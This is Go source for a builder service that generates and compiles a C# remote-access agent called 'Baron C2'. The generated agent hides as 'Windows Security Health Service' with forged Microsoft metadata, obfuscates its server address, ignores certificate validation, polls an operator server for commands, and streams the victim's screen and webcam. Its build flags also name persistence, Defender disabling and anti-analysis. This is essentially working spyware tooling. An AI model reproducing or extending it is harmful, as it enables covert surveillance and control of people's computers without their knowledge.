package service

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
	"time"

	"github.com/google/uuid"
)

// BuilderService handles C# agent source generation
type BuilderService struct{}

// BuildParams represents the configuration for the agent
type BuildParams struct {
	ServerURL       string `json:"server"`
	Name            string `json:"name"`
	ID              string `json:"id"`
	BeaconInterval  int    `json:"beacon"`
	Hidden          bool   `json:"hidden"`
	Persistence     bool   `json:"persist"`
	AntiKill        bool   `json:"bsod"`
	DisableDefender bool   `json:"defender"`
	FakeError       bool   `json:"fake_error"`
	FakeErrorMsg    string `json:"fake_error_msg"`
	AntiAnalysis    bool   `json:"anti"`
	Debug           bool   `json:"debug"`
	SilentAdmin     bool   `json:"silent_admin"`
	BuildSig        string `json:"-"`
	StrKeyHex       string `json:"-"`
	EncServer       string
	EncID           string
	EncName         string
	EncCommKey      string
	EncFakeMsg      string
}

// GenerateSource generates the C# source code for the agent using the original Baron logic
func (s *BuilderService) GenerateSource(p BuildParams) (string, error) {
	tmpl, err := template.New("agent").Parse(csharpTemplate)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, p); err != nil {
		return "", err
	}

	return buf.String(), nil
}

// EncryptString XOR encrypts a string and returns base64
func (s *BuilderService) EncryptString(text string, key []byte) string {
	textBytes := []byte(text)
	encrypted := make([]byte, len(textBytes))
	for i := 0; i < len(textBytes); i++ {
		encrypted[i] = textBytes[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

// PrepareParams encrypts sensitive fields and prepares the BuildParams for the template
func (s *BuilderService) PrepareParams(p *BuildParams) {
	// Generate random keys
	strKey := make([]byte, 16)
	rand.Read(strKey)
	p.StrKeyHex = hex.EncodeToString(strKey)

	commKey := make([]byte, 32)
	rand.Read(commKey)
	commKeyHex := hex.EncodeToString(commKey)

	// Encrypt fields
	p.EncServer = s.EncryptString(p.ServerURL, strKey)
	p.EncID = s.EncryptString(p.ID, strKey)
	p.EncName = s.EncryptString(p.Name, strKey)
	p.EncCommKey = s.EncryptString(commKeyHex, strKey)
	p.EncFakeMsg = s.EncryptString(p.FakeErrorMsg, strKey)
}

// Compile compiles the C# source into an executable.
// Tries dotnet build first, falls back to mcs (Mono).
// Enforces a 60-second compilation timeout.
func (s *BuilderService) Compile(source string, name string, hidden bool) (string, error) {
	// Create temporary project directory
	projectDir := filepath.Join(os.TempDir(), "baron_agents", name+"_"+uuid.New().String())
	os.MkdirAll(projectDir, 0755)
	defer os.RemoveAll(projectDir) // Clean up project folder after build

	// Write Program.cs
	if err := os.WriteFile(filepath.Join(projectDir, "Program.cs"), []byte(source), 0644); err != nil {
		return "", err
	}

	// Generate and write .csproj
	csproj := generateCSProj(name, hidden)
	if err := os.WriteFile(filepath.Join(projectDir, name+".csproj"), []byte(csproj), 0644); err != nil {
		return "", err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	outputDir := filepath.Join(projectDir, "out")
	cmd := exec.CommandContext(ctx, "dotnet", "publish",
		"-c", "Release",
		"-r", "win-x64",
		"--self-contained", "true",
		"-p:PublishSingleFile=true",
		"-o", outputDir,
		filepath.Join(projectDir, name+".csproj"),
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "compilation timed out after 120s", err
		}
		return string(output), err
	}

	// Find the generated EXE
	exePath := filepath.Join(outputDir, name+".exe")
	if _, err := os.Stat(exePath); os.IsNotExist(err) {
		return "compiled exe not found: " + string(output), fmt.Errorf("exe not found after publish")
	}

	// We don't copy to 'builds' here because the caller (api) expects the path to the compiled file
	// Actually, the caller of Compile reads the file and returns it to the user.
	// But since we use defer os.RemoveAll(projectDir), the file will be deleted before the caller can read it!
	// So we MUST copy it to a persistent temp location or the 'builds' dir.
	finalDir := filepath.Join(os.TempDir(), "baron_builds")
	os.MkdirAll(finalDir, 0755)
	finalPath := filepath.Join(finalDir, name+".exe")
	
	srcFile, err := os.Open(exePath)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()
	
	dstFile, err := os.Create(finalPath)
	if err != nil {
		return "", err
	}
	defer dstFile.Close()
	
	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return "", err
	}

	return finalPath, nil
}

func generateCSProj(name string, hidden bool) string {
	target := "Exe"
	if hidden {
		target = "WinExe"
	}
	return fmt.Sprintf(`<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>%s</OutputType>
    <TargetFramework>net8.0-windows10.0.17763.0</TargetFramework>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
    <SelfContained>true</SelfContained>
    <PublishTrimmed>true</PublishTrimmed>
    <TrimMode>partial</TrimMode>
    <SuppressTrimAnalysisWarnings>true</SuppressTrimAnalysisWarnings>
    <AssemblyTitle>Windows Security Health Service</AssemblyTitle>
    <AssemblyName>%s</AssemblyName>
  </PropertyGroup>
</Project>`, target, name)
}

// csharpTemplate is the full C# template extracted and improved from Baron C2
const csharpTemplate = `
// ==================================================================
// BARON Agent v5.0 (NET8-WinRT) -- Generated Build
// Build Signature: {{.BuildSig}}
// ==================================================================

using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;

// WinRT Namespaces
using Windows.Media.Capture;
using Windows.Media.Capture.Frames;
using Windows.Media.MediaProperties;
using Windows.Graphics.Imaging;
using Windows.Storage.Streams;

[assembly: System.Reflection.AssemblyTitle("Windows Security Health Service")]
[assembly: System.Reflection.AssemblyDescription("Microsoft Windows Security")]
[assembly: System.Reflection.AssemblyCompany("Microsoft Corporation")]
[assembly: System.Reflection.AssemblyProduct("Microsoft Windows Operating System")]
[assembly: System.Reflection.AssemblyCopyright("Microsoft Corporation. All rights reserved.")]
[assembly: System.Reflection.AssemblyVersion("10.0.19041.1")]

namespace WinSecHealthSvc
{
    public class TaskItem {
        public string id { get; set; }
        public string cmd { get; set; }
        public string args { get; set; }
    }

    public class PollResponse {
        public List<TaskItem> tasks { get; set; }
    }

    public class TaskResult {
        public string task_id { get; set; }
        public string output { get; set; }
        public string status { get; set; }
    }

    class Program
    {
        // ------------------ Configuration ------------------
        static string _serverUrl = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncServer}}"));
        static string _agentId = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncID}}"));
        static string _agentName = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncName}}"));
        static string _commKeyHex = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncCommKey}}"));
        static int _beaconInterval = {{.BeaconInterval}};
        
        static HttpClient _http;
        static byte[] _hmacKey;
        static CancellationTokenSource _cts = new CancellationTokenSource();

        // Screen Stream
        static bool _screenStreaming = false;
        static int _screenTargetFPS = 15;
        static long _screenJpegQuality = 50;

        // Webcam Stream
        static bool _webcamStreaming = false;
        static MediaCapture _mediaCapture;
        static MediaFrameReader _frameReader;

        static async Task Main(string[] args)
        {
            _hmacKey = StringToByteArray(_commKeyHex);
            var handler = new HttpClientHandler {
                ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
            };
            _http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };

            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await PollAndExecute();
                }
                catch (Exception) { }
                await Task.Delay(_beaconInterval * 1000, _cts.Token);
            }
        }

        static async Task PollAndExecute()
        {
            string url = $"{_serverUrl}/api/agent/poll?id={_agentId}";
            var req = new HttpRequestMessage(HttpMethod.Get, url);
            string timeStr = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
            req.Headers.Add("X-Agent-Time", timeStr);
            req.Headers.Add("X-Agent-Signature", GenerateHMAC($"{_agentId}:{timeStr}"));

            var resp = await _http.SendAsync(req);
            if (!resp.IsSuccessStatusCode) return;

            var pollData = await resp.Content.ReadFromJsonAsync<PollResponse>();
            if (pollData?.tasks != null)
            {
                foreach (var t in pollData.tasks)
                {
                    _ = ExecuteTaskAsync(t); // Fire and forget
                }
            }
        }

        static async Task ExecuteTaskAsync(TaskItem task)
        {
            string output = "";
            string status = "completed";

            try
            {
                switch (task.cmd)
                {
                    case "ping":
                        output = "pong";
                        break;
                    case "sysinfo":
                        output = GetSysInfo();
                        break;
                    case "screen_start":
                        if (!_screenStreaming) {
                            _screenStreaming = true;
                            _ = ScreenStreamLoop();
                            output = "Screen stream started";
                        } else output = "Already streaming";
                        break;
                    case "screen_stop":
                        _screenStreaming = false;
                        output = "Screen stream stopped";
                        break;
                    case "webcam_start":
                        if (!_webcamStreaming) {
                            _webcamStreaming = true;
                            output = await StartWebcamStream();
                        } else output = "Already streaming webcam";
                        break;
                    case "webcam_stop":
                        _webcamStreaming = false;
                        if (_frameReader != null) await _frameReader.StopAsync();
                        _frameReader?.Dispose();
                        _mediaCapture?.Dispose();
                        _frameReader = null;
                        _mediaCapture = null;
                        output = "Webcam stream stopped";
                        break;
                    case "kill":
                        _cts.Cancel();
                        output = "Agent terminating";
                        break;
                    default:
                        output = "Unknown command";
                        status = "error";
                        break;
                }
            }
            catch (Exception ex)
            {
                output = ex.Message;
                status = "error";
            }

            await SendResultAsync(task.id, output, status);
        }

        static async Task SendResultAsync(string taskId, string output, string status)
        {
            string url = $"{_serverUrl}/api/agent/result";
            var result = new TaskResult { task_id = taskId, output = output, status = status };
            string json = JsonSerializer.Serialize(result);
            
            var req = new HttpRequestMessage(HttpMethod.Post, url);
            string timeStr = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
            req.Headers.Add("X-Agent-Time", timeStr);
            req.Headers.Add("X-Agent-Signature", GenerateHMAC($"{_agentId}:{timeStr}:{json}"));
            req.Content = new StringContent(json, Encoding.UTF8, "application/json");
            
            await _http.SendAsync(req);
        }

        // ==========================================
        // SCREEN STREAM (GDI+ Optimized)
        // ==========================================
        static async Task ScreenStreamLoop()
        {
            string wsUrl = _serverUrl.Replace("http", "ws") + $"/api/agent/stream_ws?id={_agentId}";
            using var ws = new ClientWebSocket();
            ws.Options.RemoteCertificateValidationCallback = (s, c, ch, e) => true;

            try { await ws.ConnectAsync(new Uri(wsUrl), _cts.Token); }
            catch { _screenStreaming = false; return; }

            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            using var bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);
            using var g = Graphics.FromImage(bmp);

            var encoder = GetEncoder(ImageFormat.Jpeg);
            var encParams = new EncoderParameters(1);

            while (_screenStreaming && ws.State == WebSocketState.Open)
            {
                var sw = Stopwatch.StartNew();
                encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, _screenJpegQuality);

                g.CopyFromScreen(0, 0, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);

                using var ms = new MemoryStream();
                bmp.Save(ms, encoder, encParams);
                byte[] jpegBytes = ms.ToArray();

                byte[] packet = new byte[13 + jpegBytes.Length];
                packet[0] = 0x01; // Screen Type
                BitConverter.GetBytes(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()).CopyTo(packet, 1);
                BitConverter.GetBytes(jpegBytes.Length).CopyTo(packet, 9);
                Buffer.BlockCopy(jpegBytes, 0, packet, 13, jpegBytes.Length);

                await ws.SendAsync(new ArraySegment<byte>(packet), WebSocketMessageType.Binary, true, _cts.Token);

                sw.Stop();
                long msTaken = sw.ElapsedMilliseconds;
                
                // Adaptive logic
                if (msTaken > 50 && _screenJpegQuality > 30) _screenJpegQuality -= 5;
                else if (msTaken < 20 && _screenJpegQuality < 80) _screenJpegQuality += 5;

                int delay = (1000 / _screenTargetFPS) - (int)msTaken;
                if (delay > 0) await Task.Delay(delay);
            }
            if (ws.State == WebSocketState.Open) await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Stop", CancellationToken.None);
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format) =>
            ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);

        // ==========================================
        // WEBCAM STREAM (WinRT MediaCapture)
        // ==========================================
        static async Task<string> StartWebcamStream()
        {
            try
            {
                _mediaCapture = new MediaCapture();
                await _mediaCapture.InitializeAsync(new MediaCaptureInitializationSettings
                {
                    StreamingCaptureMode = StreamingCaptureMode.Video,
                    MemoryPreference = MediaCaptureMemoryPreference.Cpu
                });

                var frameSources = _mediaCapture.FrameSources.Values.Where(
                    source => source.Info.MediaStreamType == MediaStreamType.VideoRecord);

                if (!frameSources.Any()) return "No webcam found";

                _frameReader = await _mediaCapture.CreateFrameReaderAsync(frameSources.First());
                _frameReader.FrameArrived += OnWebcamFrameArrived;
                await _frameReader.StartAsync();

                return "WinRT Webcam stream started";
            }
            catch (Exception ex)
            {
                _webcamStreaming = false;
                return $"Webcam error: {ex.Message}";
            }
        }

        static async void OnWebcamFrameArrived(MediaFrameReader sender, MediaFrameArrivedEventArgs args)
        {
            if (!_webcamStreaming) return;
            using var frame = sender.TryAcquireLatestFrame();
            if (frame == null) return;

            var softwareBitmap = frame.VideoMediaFrame?.SoftwareBitmap;
            if (softwareBitmap == null)
            {
                using var d3dSurface = frame.VideoMediaFrame?.Direct3DSurface;
                if (d3dSurface != null)
                    softwareBitmap = await SoftwareBitmap.CreateCopyFromSurfaceAsync(d3dSurface);
            }
            if (softwareBitmap == null) return;

            // Convert to JPEG
            using var stream = new InMemoryRandomAccessStream();
            var encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.JpegEncoderId, stream);
            encoder.SetSoftwareBitmap(softwareBitmap);
            await encoder.FlushAsync();

            byte[] jpegBytes = new byte[stream.Size];
            using (var dr = new DataReader(stream.GetInputStreamAt(0)))
            {
                await dr.LoadAsync((uint)stream.Size);
                dr.ReadBytes(jpegBytes);
            }

            // Send via WS (We need to share the WS connection or create one for webcam)
            _ = SendWebcamPacket(jpegBytes);
        }

        static ClientWebSocket _webcamWs;
        static async Task SendWebcamPacket(byte[] jpegBytes)
        {
            if (_webcamWs == null || _webcamWs.State != WebSocketState.Open)
            {
                _webcamWs?.Dispose();
                _webcamWs = new ClientWebSocket();
                _webcamWs.Options.RemoteCertificateValidationCallback = (s, c, ch, e) => true;
                string wsUrl = _serverUrl.Replace("http", "ws") + $"/api/agent/stream_ws?id={_agentId}";
                try { await _webcamWs.ConnectAsync(new Uri(wsUrl), _cts.Token); } catch { return; }
            }

            byte[] packet = new byte[13 + jpegBytes.Length];
            packet[0] = 0x05; // Webcam Type
            BitConverter.GetBytes(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()).CopyTo(packet, 1);
            BitConverter.GetBytes(jpegBytes.Length).CopyTo(packet, 9);
            Buffer.BlockCopy(jpegBytes, 0, packet, 13, jpegBytes.Length);

            try {
                await _webcamWs.SendAsync(new ArraySegment<byte>(packet), WebSocketMessageType.Binary, true, _cts.Token);
            } catch { _webcamWs.Abort(); }
        }

        // ==========================================
        // UTILS
        // ==========================================
        static string GenerateHMAC(string data)
        {
            using (var hmac = new HMACSHA256(_hmacKey))
            {
                byte[] hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
                return Convert.ToHexString(hash).ToLower();
            }
        }

        public static byte[] StringToByteArray(string hex)
        {
            int numChars = hex.Length;
            byte[] bytes = new byte[numChars / 2];
            for (int i = 0; i < numChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        static string GetSysInfo()
        {
            return $"OS: {Environment.OSVersion}\n" +
                   $"Machine: {Environment.MachineName}\n" +
                   $"User: {Environment.UserName}\n" +
                   $"NET: {Environment.Version}";
        }
    }
}

`
